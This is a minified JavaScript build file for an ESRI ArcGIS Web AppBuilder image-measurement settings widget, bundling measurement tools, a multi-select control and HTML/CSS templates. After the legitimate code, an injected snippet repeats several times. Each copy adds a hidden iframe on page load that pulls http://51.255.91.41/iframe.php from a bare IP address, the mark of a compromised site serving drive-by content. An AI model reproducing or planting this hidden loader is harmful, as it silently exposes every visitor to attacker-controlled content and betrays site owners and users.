// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"esri/toolbars/ImageServiceMeasureTool":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/Color dojo/has ../kernel ./_toolbar ../symbols/SimpleMarkerSymbol ../symbols/SimpleLineSymbol ../symbols/SimpleFillSymbol ./draw ../tasks/ImageServiceMeasureParameters ../tasks/ImageServiceMeasureTask ../geometry/Point dojo/_base/array ../units".split(" "),function(c,e,d,l,n,g,m,p,f,q,b,u,t,r,h){var v=c("CustomDraw",[q],{returnCurrentPoint:function(){return this._points},hideTooltip:function(){this._options.showTooltips=
!1},showTooltip:function(){this._options.showTooltips=!0}});g=c(g,{declaredClass:"esri.toolbars.imageServiceMeasure",_eventMap:{"draw-end":["geometry"],"draw-start":[],"measure-end":["measureResult","error","geometry"],"unit-change":["measureResult","error","geometry"]},_mensurationCapabilitiesMap:{Basic:["OPERATION_POINT","OPERATION_DISTANCE_ANGLE","OPERATION_AREA_PERIMETER","OPERATION_CENTROID"],"3D":["OPERATION_POINT_3D","OPERATION_DISTANCE_ANGLE_3D","OPERATION_AREA_PERIMETER_3D","OPERATION_CENTROID_3D"],
"Base-Top Height":["OPERATION_BASE_TOP"],"Top-Top Shadow Height":["OPERATION_TOP_TOP_SHADOW"],"Base-Top Shadow Height":["OPERATION_BASE_TOP_SHADOW"]},_supportedMeasureOperations:[],_operationsMap:{OPERATION_POINT:{geometryType:"POINT"},OPERATION_DISTANCE_ANGLE:{geometryType:"LINE"},OPERATION_AREA_PERIMETER:{geometryType:"POLYGON"},OPERATION_BASE_TOP:{geometryType:"LINE"},OPERATION_BASE_TOP_SHADOW:{geometryType:"LINE"},OPERATION_TOP_TOP_SHADOW:{geometryType:"LINE"},OPERATION_CENTROID:{geometryType:"POLYGON"},
OPERATION_POINT_3D:{geometryType:"POINT"},OPERATION_DISTANCE_ANGLE_3D:{geometryType:"LINE"},OPERATION_AREA_PERIMETER_3D:{geometryType:"POLYGON"},OPERATION_CENTROID_3D:{geometryType:"POLYGON"}},_supportedUnits:{linearUnits:"INCHES FEET YARDS MILES NAUTICAL_MILES MILLIMETERS CENTIMETERS DECIMETERS METERS KILOMETERS".split(" "),angularUnits:["RADIANS","DECIMAL_DEGREES"],areaUnits:"SQUARE_INCHES SQUARE_FEET SQUARE_YARDS ACRES SQUARE_MILES SQUARE_MILLIMETERS SQUARE_CENTIMETERS SQUARE_DECIMETERS SQUARE_METERS ARES HECTARES SQUARE_KILOMETERS".split(" ")},
markerSymbol:null,lineSymbol:null,fillSymbol:null,_drawToolbar:null,_currentGeometry:null,_currentOperation:null,linearUnit:null,angularUnit:null,areaUnit:null,_decimalDegreesConstantValue:"esriDUDecimalDegrees",_decimalDegreesConstantKeyword:"DECIMAL_DEGREES",constructor:function(a){c.safeMixin(this,a);this._checkMensurationSupport();this._setDefaultSymbols()},_checkMensurationSupport:function(){this.layer.mensurationCapabilities?this._setSupportedMeasureOperations():console.log("Mensuration Capabilities not supported.")},
_setDefaultSymbols:function(){this.markerSymbol||(this.markerSymbol=new m,this.markerSymbol.setPath("M16,4.938c-7.732,0-14,4.701-14,10.5c0,1.981,0.741,3.833,2.016,5.414L2,25.272l5.613-1.44c2.339,1.316,5.237,2.106,8.387,2.106c7.732,0,14-4.701,14-10.5S23.732,4.938,16,4.938zM16.868,21.375h-1.969v-1.889h1.969V21.375zM16.772,18.094h-1.777l-0.176-8.083h2.113L16.772,18.094z"),this.markerSymbol.setColor(new d("#00FFFF")));this.lineSymbol||(this.lineSymbol=new p(p.STYLE_SOLID,new d([255,0,0]),1.5));this.fillSymbol||
(this.fillSymbol=new f(f.STYLE_SOLID,new p(p.STYLE_DASHDOT,new d([255,0,0]),2),new d([255,255,0,.25])))},_setSupportedMeasureOperations:function(){var a;this._supportedMeasureOperations=[];this.mensurationCapabilities=this.layer.mensurationCapabilities.split(",");r.forEach(this.mensurationCapabilities,function(b){a=this._mensurationCapabilitiesMap[b];r.forEach(a,function(a){this._supportedMeasureOperations.push(a)},this)},this)},getSupportedMeasureOperations:function(){var a=[];r.forEach(this._supportedMeasureOperations,
function(w){a.push(b[w])},this);return a},getSupportedUnits:function(){var a={},b=[],f=[],c;for(c in this._supportedUnits)this._supportedUnits.hasOwnProperty(c)&&(b=this._supportedUnits[c],f=[],r.forEach(b,function(a){a===this._decimalDegreesConstantKeyword?f.push(this._decimalDegreesConstantValue):f.push(h[a])},this),a[c]=f);return a},setLinearUnit:function(a){for(var b in h)h.hasOwnProperty(b)&&h[b]===a&&(this.linearUnit=b);this._currentGeometry&&this._getUnitChangeResults(this._currentGeometry)},
setAngularUnit:function(a){for(var b in h)h.hasOwnProperty(b)&&(h[b]===a?this.angularUnit=b:a===this._decimalDegreesConstantValue&&(this.angularUnit=this._decimalDegreesConstantKeyword));this._currentGeometry&&this._getUnitChangeResults(this._currentGeometry)},setAreaUnit:function(a){for(var b in h)h.hasOwnProperty(b)&&h[b]===a&&(this.areaUnit=b);this._currentGeometry&&this._getUnitChangeResults(this._currentGeometry)},setMarkerSymbol:function(a){this.markerSymbol=a},setLineSymbol:function(a){this.lineSymbol=
a},setFillSymbol:function(a){this.fillSymbol=a},activate:function(a){r.forEach(this._supportedMeasureOperations,function(f){b[f]===a&&(this._currentOperation=f)},this);this.map.setMapCursor("crosshair");this._mapClickHandle=this.map.on("click",e.hitch(this,this._onMapClick));this._mapMouseDownHandle=this.map.on("mouse-down",e.hitch(this,this._onMapMouseDown));this._drawToolbar||(this._drawToolbar=new v(this.map,{fillSymbol:this.fillSymbol,markerSymbol:this.markerSymbol,lineSymbol:this.lineSymbol}),
this._drawToolbar.on("draw-end",e.hitch(this,this._setGeometry)));this._drawToolbar.activate(q[this._operationsMap[this._currentOperation].geometryType])},_onMapClick:function(){if(0===this._drawToolbar.returnCurrentPoint().length)this.onDrawStart()},_onMapMouseDown:function(){if(0===this._drawToolbar.returnCurrentPoint().length)this.onDrawStart()},deactivate:function(){this._drawToolbar&&this._drawToolbar.deactivate();this.map.setMapCursor("default");this._currentOperation=this._currentGeometry=
null;this._mapClickHandle&&(this._mapClickHandle.remove(),this._mapClickHandle=null);this._mapMouseDownHandle&&(this._mapMouseDownHandle.remove(),this._mapMouseDownHandle=null)},hideDrawTooltip:function(){this._drawToolbar.deactivate();this._drawToolbar.hideTooltip();this._drawToolbar.activate(q[this._operationsMap[this._currentOperation].geometryType])},showDrawTooltip:function(){this._drawToolbar.deactivate();this._drawToolbar.showTooltip();this._drawToolbar.activate(q[this._operationsMap[this._currentOperation].geometryType])},
_setGeometry:function(a){a=a.geometry;this.onDrawEnd(a);this._getMensurationResults(a);this._currentGeometry=a},_getImageServiceMeasureParameters:function(a){var f=new b;f.operation=b[this._currentOperation];f.mosaicRule=this.layer.mosaicRule;f.linearUnit=h[this.linearUnit];f.angularUnit=this.angularUnit===this._decimalDegreesConstantKeyword?this._decimalDegreesConstantValue:h[this.angularUnit];f.areaUnit=h[this.areaUnit];"line"===a.type||"polyline"===a.type?(f.fromGeometry=new t(a.paths[0][0][0],
a.paths[0][0][1],this.map.spatialReference),f.toGeometry=new t(a.paths[0][1][0],a.paths[0][1][1],this.map.spatialReference)):f.fromGeometry=a;return f},_getMensurationResults:function(a){a=this._getImageServiceMeasureParameters(a);(new u(this.layer.url)).execute(a,e.hitch(this,this._measureTaskSuccess),e.hitch(this,this._measureTaskError))},_measureTaskSuccess:function(a){this.onMeasureEnd(a,null,this._currentGeometry)},_measureTaskError:function(a){this.onMeasureEnd(null,a,this._currentGeometry)},
_getUnitChangeResults:function(a){a=this._getImageServiceMeasureParameters(a);(new u(this.layer.url)).execute(a,e.hitch(this,this._unitChangeSuccess),e.hitch(this,this._unitChangeError))},_unitChangeSuccess:function(a){this.onUnitChange(a,null,this._currentGeometry)},_unitChangeError:function(a){this.onUnitChange(null,a,this._currentGeometry)},onDrawStart:function(){},onDrawEnd:function(){},onMeasureEnd:function(){},onUnitChange:function(){}});l("extend-esri")&&e.setObject("toolbars.imageServiceMeasure",
g,n);return g})},"esri/tasks/ImageServiceMeasureParameters":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/json dojo/has ../kernel ../geometry/jsonUtils".split(" "),function(c,e,d,l,n,g){c=c(null,{declaredClass:"esri.tasks.ImageServiceMeasureParameters",fromGeometry:null,toGeometry:null,operation:null,pixelSize:null,mosaicRule:!1,linearUnit:null,angularUnit:null,areaUnit:null,toJson:function(c){var e=c&&c.fromGeometry||this.fromGeometry;c={fromGeometry:e,toGeometry:c&&c.toGeometry||
this.toGeometry,measureOperation:this.operation,mosaicRule:this.mosaicRule?d.toJson(this.mosaicRule.toJson()):null,linearUnit:this.linearUnit,angularUnit:this.angularUnit,areaUnit:this.areaUnit};e&&(c.geometryType=g.getJsonType(e));this.pixelSize&&(c.pixelSize=this.pixelSize?d.toJson(this.pixelSize.toJson()):null);return c}});e.mixin(c,{OPERATION_POINT:"esriMensurationPoint",OPERATION_DISTANCE_ANGLE:"esriMensurationDistanceAndAngle",OPERATION_AREA_PERIMETER:"esriMensurationAreaAndPerimeter",OPERATION_BASE_TOP:"esriMensurationHeightFromBaseAndTop",
OPERATION_BASE_TOP_SHADOW:"esriMensurationHeightFromBaseAndTopShadow",OPERATION_TOP_TOP_SHADOW:"esriMensurationHeightFromTopAndTopShadow",OPERATION_CENTROID:"esriMensurationCentroid",OPERATION_POINT_3D:"esriMensurationPoint3D",OPERATION_DISTANCE_ANGLE_3D:"esriMensurationDistanceAndAngle3D",OPERATION_AREA_PERIMETER_3D:"esriMensurationAreaAndPerimeter3D",OPERATION_CENTROID_3D:"esriMensurationCentroid3D"});l("extend-esri")&&e.setObject("tasks.ImageServiceMeasureParameters",c,n);return c})},"esri/tasks/ImageServiceMeasureTask":function(){define("dojo/_base/declare dojo/_base/lang dojo/has ../kernel ../request ../geometry/normalizeUtils ./Task".split(" "),
function(c,e,d,l,n,g,m){c=c(m,{declaredClass:"esri.tasks.ImageServiceMeasureTask",constructor:function(c){this._url.path+="/measure";this._handler=e.hitch(this,this._handler)},__msigns:[{n:"execute",c:3,a:[{i:0,p:["fromGeometry","toGeometry"]}],e:2}],_handler:function(c,f,e,b,d){try{this._successHandler([c],"onComplete",e,d)}catch(t){this._errorHandler(t,b,d)}},execute:function(c,f,d,b){var g=b.assembly;c=this._encode(e.mixin({},this._url.query,{f:"json"},c.toJson(g&&g[0])));var q=this._handler,l=
this._errorHandler;return n({url:this._url.path,content:c,callbackParamName:"callback",load:function(c,e){q(c,e,f,d,b.dfd)},error:function(c){l(c,d,b.dfd)}})},onComplete:function(){}});g._createWrappers(c);d("extend-esri")&&e.setObject("tasks.ImageServiceMeasureTask",c,l);return c})},"dojox/form/CheckedMultiSelect":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/event dojo/dom-geometry dojo/dom-class dojo/dom-construct dojo/i18n dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dijit/registry dijit/Menu dijit/MenuItem dijit/Tooltip dijit/form/_FormSelectWidget dijit/form/ComboButton dojo/text!dojox/form/resources/_CheckedMultiSelectMenuItem.html dojo/text!dojox/form/resources/_CheckedMultiSelectItem.html dojo/text!dojox/form/resources/CheckedMultiSelect.html dojo/i18n!dojox/form/nls/CheckedMultiSelect dijit/form/CheckBox".split(" "),
function(c,e,d,l,n,g,m,p,f,q,b,u,t,r,h,v,a,w,x,y,C){var z=c("dojox.form._CheckedMultiSelectItem",[f,q,b],{templateString:x,baseClass:"dojoxMultiSelectItem",option:null,parent:null,disabled:!1,readOnly:!1,postMixInProperties:function(){this._type=this.parent.multiple?{type:"checkbox",baseClass:"dijitCheckBox"}:{type:"radio",baseClass:"dijitRadio"};this.disabled||(this.disabled=this.option.disabled=this.option.disabled||!1);this.readOnly||(this.readOnly=this.option.readOnly=this.option.readOnly||!1);
this.inherited(arguments)},postCreate:function(){this.inherited(arguments);this.labelNode.innerHTML=this.option.label},_changeBox:function(){this.get("disabled")||this.get("readOnly")||(this.parent.multiple?this.option.selected=this.checkBox.get("value")&&!0:this.parent.set("value",this.option.value),this.parent._updateSelection(),this.parent.focus())},_onClick:function(k){this.get("disabled")||this.get("readOnly")?l.stop(k):this.checkBox._onClick(k)},_updateBox:function(){this.checkBox.set("value",
this.option.selected)},_setDisabledAttr:function(k){this.disabled=k||this.option.disabled;this.checkBox.set("disabled",this.disabled);g.toggle(this.domNode,"dojoxMultiSelectDisabled",this.disabled)},_setReadOnlyAttr:function(k){this.checkBox.set("readOnly",k);this.readOnly=k}}),A=c("dojox.form._CheckedMultiSelectMenu",t,{multiple:!1,buildRendering:function(){this.inherited(arguments);var k=this.menuTableNode=this.domNode,a=this.domNode=m.create("div",{style:{overflowX:"hidden",overflowY:"scroll"}});
k.parentNode&&k.parentNode.replaceChild(a,k);g.remove(k,"dijitMenuTable");a.className=k.className+" dojoxCheckedMultiSelectMenu";k.className="dijitReset dijitMenuTable";k.setAttribute("role","listbox");a.setAttribute("role","presentation");a.appendChild(k)},resize:function(a){a&&(n.setMarginBox(this.domNode,a),"w"in a&&(this.menuTableNode.style.width="100%"))},onClose:function(){this.inherited(arguments);this.menuTableNode&&(this.menuTableNode.style.width="")},onItemClick:function(a,b){"undefined"==
typeof this.isShowingNow&&this._markActive();this.focusChild(a);if(a.disabled||a.readOnly)return!1;if(!this.multiple)this.onExecute();a.onClick(b)}}),B=c("dojox.form._CheckedMultiSelectMenuItem",r,{templateString:w,option:null,parent:null,iconClass:"",postMixInProperties:function(){this.parent.multiple?(this._iconClass="dojoxCheckedMultiSelectMenuCheckBoxItemIcon",this._type={type:"checkbox"}):(this._iconClass="",this._type={type:"hidden"});this.disabled=this.option.disabled;this.checked=this.option.selected;
this.label=this.option.label;this.readOnly=this.option.readOnly;this.inherited(arguments)},onChange:function(a){},_updateBox:function(){g.toggle(this.domNode,"dojoxCheckedMultiSelectMenuItemChecked",!!this.option.selected);this.domNode.setAttribute("aria-checked",this.option.selected);this.inputNode.checked=this.option.selected;this.parent.multiple||g.toggle(this.domNode,"dijitSelectSelectedOption",!!this.option.selected)},_onClick:function(a){this.disabled||this.readOnly||(this.parent.multiple?(this.option.selected=
!this.option.selected,this.parent.onChange(),this.onChange(this.option.selected)):this.option.selected||(d.forEach(this.parent.getChildren(),function(a){a.option.selected=!1}),this.option.selected=!0,this.parent.onChange(),this.onChange(this.option.selected)));this.inherited(arguments)}});return c("dojox.form.CheckedMultiSelect",v,{templateString:y,baseClass:"dojoxCheckedMultiSelect",required:!1,invalidMessage:"$_unset_$",_message:"",dropDown:!1,labelText:"",tooltipPosition:[],postMixInProperties:function(){this.inherited(arguments);
this._nlsResources=p.getLocalization("dojox.form","CheckedMultiSelect",this.lang);"$_unset_$"==this.invalidMessage&&(this.invalidMessage=this._nlsResources.invalidMessage)},_fillContent:function(){this.inherited(arguments);if(this.options.length&&!this.value&&this.srcNodeRef){var a=this.srcNodeRef.selectedIndex||0;this.value=this.options[0<=a?a:0].value}this.dropDown&&(g.toggle(this.selectNode,"dojoxCheckedMultiSelectHidden"),this.dropDownMenu=new A({id:this.id+"_menu",style:"display: none;",multiple:this.multiple,
onChange:e.hitch(this,"_updateSelection")}))},startup:function(){this.dropDown&&(this.dropDownButton=new a({label:this.labelText,dropDown:this.dropDownMenu,baseClass:"dojoxCheckedMultiSelectButton",maxHeight:this.maxHeight},this.comboButtonNode));this.inherited(arguments)},_onMouseDown:function(a){a.preventDefault()},validator:function(){return this.required?d.some(this.getOptions(),function(a){return a.selected&&null!=a.value&&0!=a.value.toString().length}):!0},validate:function(a){h.hide(this.domNode);
(a=this.isValid(a))||this.displayMessage(this.invalidMessage);return a},isValid:function(a){return this.validator()},getErrorMessage:function(a){return this.invalidMessage},displayMessage:function(a){h.hide(this.domNode);a&&h.show(a,this.domNode,this.tooltipPosition)},onAfterAddOptionItem:function(a,b){},_addOptionItem:function(a){var b;this.dropDown?(b=new B({option:a,parent:this.dropDownMenu}),this.dropDownMenu.addChild(b)):(b=new z({option:a,parent:this,disabled:this.disabled,readOnly:this.readOnly}),
this.wrapperDiv.appendChild(b.domNode));this.onAfterAddOptionItem(b,a)},_refreshState:function(){this.validate(this.focused)},onChange:function(a){this._refreshState()},reset:function(){this.inherited(arguments);h.hide(this.domNode)},_updateSelection:function(){this.inherited(arguments);this._handleOnChange(this.value);d.forEach(this._getChildren(),function(a){a._updateBox()});m.empty(this.containerNode);var a=this;d.forEach(this.value,function(b){b=m.create("option",{value:b,label:b,selected:"selected"});
m.place(b,a.containerNode)});if(this.dropDown&&this.dropDownButton){var b=0,c="";d.forEach(this.options,function(a){a.selected&&(b++,c=a.label)});this.dropDownButton.set("label",this.multiple?e.replace(this._nlsResources.multiSelectLabelText,{num:b}):c)}},_getChildren:function(){return this.dropDown?this.dropDownMenu.getChildren():d.map(this.wrapperDiv.childNodes,function(a){return u.byNode(a)})},invertSelection:function(a){this.multiple&&(d.forEach(this.options,function(a){a.selected=!a.selected}),
this._updateSelection())},_setDisabledAttr:function(a){this.inherited(arguments);this.dropDown&&this.dropDownButton.set("disabled",a);d.forEach(this._getChildren(),function(b){b&&b.set&&b.set("disabled",a)})},_setReadOnlyAttr:function(a){this.inherited(arguments);"readOnly"in this.attributeMap&&this[this.attributeMap.readOnly].setAttribute("readonly",a);this.readOnly=a;d.forEach(this._getChildren(),function(b){b&&b.set&&b.set("readOnly",a)})},uninitialize:function(){h.hide(this.domNode);d.forEach(this._getChildren(),
function(a){a.destroyRecursive()});this.inherited(arguments)}})})},"widgets/ImageMeasurement/setting/_build-generate_module":function(){define(["dojo/text!./Setting.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:dojox/form/resources/_CheckedMultiSelectMenuItem.html":'\x3ctr class\x3d"dijitReset dijitMenuItem" dojoAttachPoint\x3d"focusNode" role\x3d"menuitemcheckbox" tabIndex\x3d"-1"\r\n\tdojoAttachEvent\x3d"ondijitclick:_onClick"\r\n\t\x3e\x3ctd class\x3d"dijitReset dijitMenuItemIconCell" role\x3d"presentation"\r\n\t\t\x3e\x3cdiv src\x3d"${_blankGif}" alt\x3d"" class\x3d"dijitMenuItemIcon ${_iconClass}" dojoAttachPoint\x3d"iconNode"\r\n\t\t\t\x3e\x3cinput class\x3d"dojoxCheckedMultiSelectCheckBoxInput" dojoAttachPoint\x3d"inputNode" type\x3d"${_type.type}"\r\n\t\t/\x3e\x3c/div\x3e\x3c/td\r\n\t\x3e\x3ctd class\x3d"dijitReset dijitMenuItemLabel" colspan\x3d"2" dojoAttachPoint\x3d"containerNode,labelNode"\x3e\x3c/td\r\n\t\x3e\x3ctd class\x3d"dijitReset dijitMenuItemAccelKey" style\x3d"display: none" dojoAttachPoint\x3d"accelKeyNode"\x3e\x3c/td\r\n\t\x3e\x3ctd class\x3d"dijitReset dijitMenuArrowCell" role\x3d"presentation"\x3e\x26nbsp;\x3c/td\r\n\x3e\x3c/tr\x3e',
"url:dojox/form/resources/_CheckedMultiSelectItem.html":'\x3cdiv class\x3d"dijitReset ${baseClass}"\r\n\t\x3e\x3cinput class\x3d"${baseClass}Box" data-dojo-type\x3d"dijit.form.CheckBox" data-dojo-attach-point\x3d"checkBox" \r\n\t\tdata-dojo-attach-event\x3d"_onClick:_changeBox" type\x3d"${_type.type}" data-dojo-props\x3d\'disabled:${disabled}, readOnly:${readOnly}\' baseClass\x3d"${_type.baseClass}"\r\n\t/\x3e\x3cdiv class\x3d"dijitInline ${baseClass}Label" data-dojo-attach-point\x3d"labelNode" data-dojo-attach-event\x3d"onclick:_onClick"\x3e\x3c/div\r\n\x3e\x3c/div\x3e\r\n',
"url:dojox/form/resources/CheckedMultiSelect.html":'\x3cdiv class\x3d"dijit dijitReset dijitInline dijitLeft" id\x3d"widget_${id}"\r\n\t\x3e\x3cdiv data-dojo-attach-point\x3d"comboButtonNode"\r\n\t\x3e\x3c/div\r\n\t\x3e\x3cdiv data-dojo-attach-point\x3d"selectNode" class\x3d"dijit dijitReset dijitInline ${baseClass}Wrapper" data-dojo-attach-event\x3d"onmousedown:_onMouseDown,onclick:focus"\r\n\t\t\x3e\x3cselect class\x3d"${baseClass}Select dojoxCheckedMultiSelectHidden" multiple\x3d"true" data-dojo-attach-point\x3d"containerNode,focusNode"\x3e\x3c/select\r\n\t\t\x3e\x3cdiv data-dojo-attach-point\x3d"wrapperDiv"\x3e\x3c/div\r\n\t\x3e\x3c/div\r\n\x3e\x3c/div\x3e',
"url:widgets/ImageMeasurement/setting/Setting.html":'\x3cdiv style\x3d"width:100%;height:100%;"\x3e\r\n  \x3cdiv class\x3d"settings-section" data-dojo-attach-point\x3d"searchesSection"\x3e\r\n    \x3ctable class\x3d"setting-table input-table" cellspacing\x3d"0"\x3e\r\n      \x3ctbody\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first"\x3e${nls.layerSelect}:\x3c/td\x3e\r\n          \x3ctd class\x3d"second"\x3e\r\n            \x3cselect style\x3d"margin: 0 10px;" data-dojo-attach-point\x3d"mapLayerSelect" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n            \x3c/select\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first"\x3e${nls.displayOperationSelect}:\x3c/td\x3e\r\n          \x3ctd class\x3d"second"\x3e\r\n            \x3cselect style\x3d"margin: 0 10px;" data-dojo-attach-point\x3d"displayOperationSelect" data-dojo-type\x3d"dojox/form/CheckedMultiSelect" multiple\x3d"true"\x3e\r\n            \x3c/select\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first"\x3e${nls.angularUnitSelect}:\x3c/td\x3e\r\n          \x3ctd class\x3d"second"\x3e\r\n            \x3cselect style\x3d"margin: 0 10px;" data-dojo-attach-point\x3d"angularUnitSelect" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n            \x3c/select\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first"\x3e${nls.linearUnitSelect}:\x3c/td\x3e\r\n          \x3ctd class\x3d"second"\x3e\r\n            \x3cselect style\x3d"margin: 0 10px;" data-dojo-attach-point\x3d"linearUnitSelect" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n            \x3c/select\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first"\x3e${nls.areaUnitSelect}:\x3c/td\x3e\r\n          \x3ctd class\x3d"second"\x3e\r\n            \x3cselect style\x3d"margin: 0 10px;" data-dojo-attach-point\x3d"areaUnitSelect" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n            \x3c/select\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd colspan\x3d"2"\x3e\x3cinput data-dojo-attach-point\x3d"popupCheckbox" data-dojo-type\x3d"dijit/form/CheckBox"/\x3e\r\n          \x3clabel  style\x3d"margin: 0 15px;" \x3e${nls.displayMeasureResultInPopup}\x3c/label\x3e\x3c/td\x3e\r\n        \x3c/tr\x3e\r\n      \x3c/tbody\x3e\r\n    \x3c/table\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"errorSection"\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/ImageMeasurement/setting/css/style.css":".jimu-widget-ImageMeasurement-setting{margin:0; padding:0; font-size:15px;}.jimu-widget-ImageMeasurement-setting .dijitArrowButtonContainer{width: 17px;}.jimu-widget-ImageMeasurement-setting .dijitSelect{height: 30px; width: 96%;}.jimu-widget-ImageMeasurement-setting .setting-table \x3e thead \x3e tr \x3e th,.jimu-widget-ImageMeasurement-setting .setting-table \x3e tbody \x3e tr \x3e td{height:40px; line-height:40px; vertical-align:middle;}.jimu-widget-ImageMeasurement-setting .input-table \x3e tbody \x3e tr \x3e .first{width:auto; padding-right:15px;}.jimu-widget-ImageMeasurement-setting .input-table \x3e tbody \x3e tr \x3e .second{width:200px;}.jimu-widget-ImageMeasurement-setting .input-table \x3e tbody \x3e tr \x3e .third{width:35px;}.settingsHidden {display: none;}.dojoxCheckedMultiSelect {margin-top: 4px; margin-bottom: 3px;}.dojoxCheckedMultiSelect .dojoxCheckedMultiSelectWrapper {height: 175px; margin: 0px; width: 250px;}",
"*now":function(c){c(['dojo/i18n!*preload*widgets/ImageMeasurement/setting/nls/Setting*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dijit/_WidgetsInTemplateMixin jimu/BaseWidgetSetting dojo/_base/array esri/toolbars/ImageServiceMeasureTool dojo/dom-class dojo/html dojo/_base/lang dojo/on jimu/dijit/RadioBtn dijit/form/CheckBox dijit/form/Select dojox/form/CheckedMultiSelect".split(" "),function(c,e,d,l,n,g,m,p){return c([d,e],{baseClass:"jimu-widget-ImageMeasurement-setting",displayMeasureResultInPopup:"",_supportedUnits:null,_supportedOperationMap:{},_hasSupportedLayer:!1,startup:function(){this.inherited(arguments);
this.config.ImageMeasurement||(this.config.ImageMeasurement={});this._supportedOperationMap={};this._populateLayers();this._hasSupportedLayer&&(this._populateOperations(),this._populateUnitDropdowns());this.setConfig(this.config)},_populateLayers:function(){var c=this.map.itemInfo.itemData.operationalLayers,e=0,b,d;for(b in c)c.hasOwnProperty(b)&&c[b].layerObject&&c[b].layerObject.mensurationCapabilities&&(e++,this.mapLayerSelect.addOption({value:c[b].title,label:c[b].title}),d=null,d=new n({map:this.map,
layer:c[b].layerObject}),this._supportedOperationMap[c[b].title]=[],this._supportedOperationMap[c[b].title]=d.getSupportedMeasureOperations(),this._supportedUnits||(this._supportedUnits=d.getSupportedUnits()));this.mapLayerSelect.on("change",p.hitch(this,this._populateOperations));0===e?(g.add(this.searchesSection,"settingsHidden"),m.set(this.errorSection,this.nls.errorSectionMessage),this._hasSupportedLayer=!1):(g.remove(this.searchesSection,"settingsHidden"),m.set(this.errorSection,""),this._hasSupportedLayer=
!0)},_populateUnitDropdowns:function(){var c=this._supportedUnits.angularUnits,d=this._supportedUnits.areaUnits;l.forEach(this._supportedUnits.linearUnits,function(b){this.linearUnitSelect.addOption({value:b,label:this.nls.unitLabel[b]})},this);l.forEach(c,function(b){this.angularUnitSelect.addOption({value:b,label:this.nls.unitLabel[b]})},this);l.forEach(d,function(b){this.areaUnitSelect.addOption({value:b,label:this.nls.unitLabel[b]})},this)},_populateOperations:function(){this._clearOperations();
this._addOptions()},_clearOperations:function(){var c=this.displayOperationSelect.getOptions();l.forEach(c,function(c){this.displayOperationSelect.removeOption(c)},this)},_addOptions:function(){var c=this._supportedOperationMap[this.mapLayerSelect.get("value")],d=this.config.ImageMeasurement;l.forEach(c,function(b){this.displayOperationSelect.addOption({value:b,label:this.nls.operationLabel[b],selected:"selected"})},this);d.displayOperations&&0<d.displayOperations.length&&this.displayOperationSelect.set("value",
d.displayOperations)},setConfig:function(c){this.config=c;this.popupCheckbox.set("checked",this.config.ImageMeasurement.displayMeasureResultInPopup);this.config.ImageMeasurement.layerTitle&&this.mapLayerSelect.set("value",this.config.ImageMeasurement.layerTitle);this.config.ImageMeasurement.linearUnit&&this.linearUnitSelect.set("value",this.config.ImageMeasurement.linearUnit);this.config.ImageMeasurement.areaUnit&&this.areaUnitSelect.set("value",this.config.ImageMeasurement.areaUnit);this.config.ImageMeasurement.angularUnit&&
this.angularUnitSelect.set("value",this.config.ImageMeasurement.angularUnit);0<this.config.ImageMeasurement.displayOperations.length&&this.displayOperationSelect.set("value",this.config.ImageMeasurement.displayOperations)},getConfig:function(){this.config.ImageMeasurement.displayMeasureResultInPopup=this.popupCheckbox.checked;this.config.ImageMeasurement.layerTitle=this.mapLayerSelect.get("value");this.config.ImageMeasurement.linearUnit=this.linearUnitSelect.get("value");this.config.ImageMeasurement.areaUnit=
this.areaUnitSelect.get("value");this.config.ImageMeasurement.angularUnit=this.angularUnitSelect.get("value");this.config.ImageMeasurement.displayOperations=this.displayOperationSelect.get("value");return this.config}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
